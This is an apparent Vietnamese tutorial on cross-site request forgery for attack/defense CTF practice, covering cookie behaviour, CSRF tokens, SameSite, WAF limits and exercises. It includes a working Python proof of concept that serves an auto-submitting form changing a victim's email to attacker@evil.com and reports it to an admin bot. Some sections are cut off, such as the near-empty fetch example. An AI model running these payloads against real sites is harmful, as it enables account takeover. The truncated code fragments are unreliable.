CSRF — Cross-Site Request Forgery

Khi 1 chức năng đổi trạng thái (đổi mật khẩu, chuyển tiền, đổi quyền) chỉ dựa vào cookie để xác thực mà không kiểm tra gì thêm — bạn tạo 1 trang độc lập tự động submit form tới chức năng đó, gửi cho nạn nhân (thường là admin bot) xem; trình duyệt nạn nhân tự đính kèm cookie của họ, khiến request "trông như chính họ gửi" dù họ không hề biết.

00 / TÓM TẮT 1 PHÚT

CSRF là gì, để làm gì?

Trình duyệt có 1 hành vi mặc định: khi gửi request tới 1 domain, nó tự động đính kèm mọi cookie đã lưu cho domain đó — kể cả khi request được "khởi xướng" từ 1 trang web hoàn toàn khác. Nếu app chỉ dựa vào cookie để biết "ai đang thao tác" (không có token xác nhận riêng), bạn có thể tạo 1 trang HTML độc lập (không cần XSS, không cần chèn gì vào app thật) tự động submit form tới app đó — khi admin bot mở trang độc của bạn, trình duyệt họ tự gửi kèm cookie thật, request trông y hệt chính admin đang thao tác.

Nếu chỉ nhớ một điều Khác XSS (cần chèn CODE vào app thật), CSRF chỉ cần 1 trang HTML độc lập, không liên quan gì tới app đích — điểm yếu nằm ở việc app tin cookie mù quáng, không phải ở chỗ app có lỗ hổng chèn code nào. Luôn đi kèm admin bot (giống XSS) vì cần nạn nhân "mở hộ" trang độc đó.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Cookie tự động đính kèm — khi trình duyệt gửi request tới domain X, nó tự thêm MỌI cookie đã lưu cho domain X vào request đó — bất kể trang nào khởi xướng request này (trang của chính X, hay 1 trang hoàn toàn khác bạn đang mở).
CSRF token — 1 chuỗi ngẫu nhiên, duy nhất cho mỗi phiên/mỗi form, server nhúng vào form thật (field ẩn) và kiểm tra lại khi nhận request. Trang độc lập của kẻ tấn công không biết giá trị token này (vì chưa từng load được trang form thật — bị Same-Origin Policy chặn đọc nội dung trang domain khác), nên không thể giả mạo đúng.
SameSite cookie — thuộc tính cookie hiện đại (Strict/Lax/None) quyết định cookie có được gửi kèm khi request bắt nguồn từ domain khác hay không — Strict/Lax (mặc định ở trình duyệt mới) đã tự chặn phần lớn CSRF cổ điển mà không cần code thêm gì.

Code hay viết (thiếu CSRF token):

// Node/Express -- chỉ check session cookie, không có csrf middleware
app.post('/change-email', requireLogin, (req, res) => {
  user.email = req.body.email;   // không hề kiểm tra request này có thật sự "chủ ý" từ user không
});
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Cookie chứng minh "đã đăng nhập", không chứng minh "chủ ý thao tác"

Có cookie hợp lệ chỉ nói lên 1 điều: trình duyệt này đã từng đăng nhập thành công. Nó không nói lên "người dùng thực sự muốn thực hiện hành động NÀY, NGAY BÂY GIỜ". Nhầm lẫn giữa 2 khái niệm này — "đã xác thực" và "có chủ ý" — chính là gốc rễ CSRF. Cách vá đúng cần thêm 1 bằng chứng chỉ trang thật mới có (CSRF token), vì trang độc của kẻ tấn công dù khiến trình duyệt tự gửi cookie được, vẫn không đọc được nội dung trang thật để lấy đúng token đó (do Same-Origin Policy chặn đọc dữ liệu cross-origin, dù vẫn cho GỬI request cross-origin).

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Trang độc lập "mượn" cookie của nạn nhân

Điểm mấu chốt: evil.com không bao giờ đọc được cookie của TARGET.com (Same-Origin Policy chặn JavaScript đọc cookie cross-domain) — nhưng nó không cần đọc, chỉ cần khiến trình duyệt tự gửi cookie đó đi, việc mà Same-Origin Policy không ngăn cản (gửi request cross-origin luôn được phép, chỉ đọc response/cookie cross-origin mới bị chặn).

C. POST JSON (form HTML không gửi được trực tiếp — cần JS fetch)

<script>

  method: 'POST',

</script>

(B) Bản gọn chắc — tự host PoC + report trong cùng script

import requests, threading, http.server, socketserver

PORT = 8000
POC = '''<html><body onload="document.forms[0].submit()">
<form action="http://TARGET/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
</form></body></html>'''

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "text/html"); self.end_headers()
        self.wfile.write(POC.encode())
    def log_message(self, *args): pass

threading.Thread(target=lambda: socketserver.TCPServer(("", PORT), Handler).serve_forever(), daemon=True).start()

def exploit_csrf(host, my_ip):
    requests.post(f"http://{host}/report", data={"url": f"http://{my_ip}:{PORT}/"}, timeout=5)

exploit_csrf("TARGET_IP", "YOUR_IP")

10 / PHÒNG THỦ — KHÓ DÙNG WAF, CẦN SỬA LOGIC

Vì sao CSRF không chặn được bằng WAF

Trang độc nằm NGOÀI service của bạnKẻ tấn công gửi PoC từ domain hoàn toàn khác (evil.com), WAF của bạn chỉ soi request gửi tới service mình — nó thấy request CSRF y hệt request hợp lệ (cùng cấu trúc, chỉ thiếu token mà bản thân app cũng không kiểm tra). Không có "payload bất thường" nào để WAF nhận diện.
Việc có thể làm (hạn chế, không triệt để)Hiệu quả
Kiểm tra header Origin/Referer qua WAF rule, chặn nếu khác domain của appGiảm được CSRF cổ điển qua form đơn giản, nhưng A/D không cho sửa source để thêm check này ở app — WAF có thể làm được 1 phần nếu header này luôn có mặt (không phải lúc nào cũng đúng)

Giống IDOR/Race Condition/Type Juggling, đây là nhóm lỗ hổng mà phòng thủ thật sự (thêm CSRF token vào code) không làm được trong khuôn khổ A/D (cấm sửa source) — thiên hẳn về phía tấn công.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅Chức năng đổi trạng thái chỉ dựa vào cookie, không CSRF token, cookie không có SameSite=Strict.
❌App có CSRF token được validate đúng cách (server so sánh với giá trị lưu theo session).
❌Cookie có SameSite=Strict (trình duyệt tự chặn gửi cookie cross-site, không cần code app làm gì thêm) — hầu hết trình duyệt hiện đại mặc định Lax, vẫn chặn được 1 phần CSRF qua GET đơn giản.

13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay, từ bắt request đổi email, Burp sinh PoC, tới khi admin bot "mắc bẫy".

Gợi ý nếu kẹtLuôn tự test PoC bằng trình duyệt thật của mình trước khi report cho bot — bot chỉ thử 1 lần, không có cơ hội sửa lỗi JS giữa chừng.

⭐⭐ Đổi 1 biến: app có CSRF token nhưng chỉ kiểm tra token CÓ TỒN TẠI trong request, không so khớp giá trị đúng với session. Viết PoC khai thác lỗ hổng validate yếu này.

Gợi ý nếu kẹtThêm field token với giá trị bất kỳ (vd "x") vào form PoC — nếu server chỉ check "có mặt", request vẫn qua.

⭐⭐⭐⭐ Tự nghĩ: endpoint chỉ nhận Content-Type: application/json (từ chối form-urlencoded) — form HTML thường không set được Content-Type này. Thiết kế payload PoC vẫn gửi được JSON qua CSRF.

Gợi ý nếu kẹtDùng <script>fetch(...)</script> với credentials: 'include' thay vì thẻ <form> — xem mục 06.C.

Thuật ngữ

CSRFCross-Site Request Forgery — ép nạn nhân gửi request tới app đích mà không hề biết, nhờ trình duyệt tự đính kèm cookie.
CSRF tokenChuỗi ngẫu nhiên duy nhất xác nhận request thật sự xuất phát từ trang hợp lệ.
SameSite cookieThuộc tính cookie giới hạn việc gửi kèm cookie khi request bắt nguồn từ domain khác.
Same-Origin PolicyQuy tắc trình duyệt: JS chỉ đọc được dữ liệu cùng origin, nhưng vẫn được phép GỬI request cross-origin.
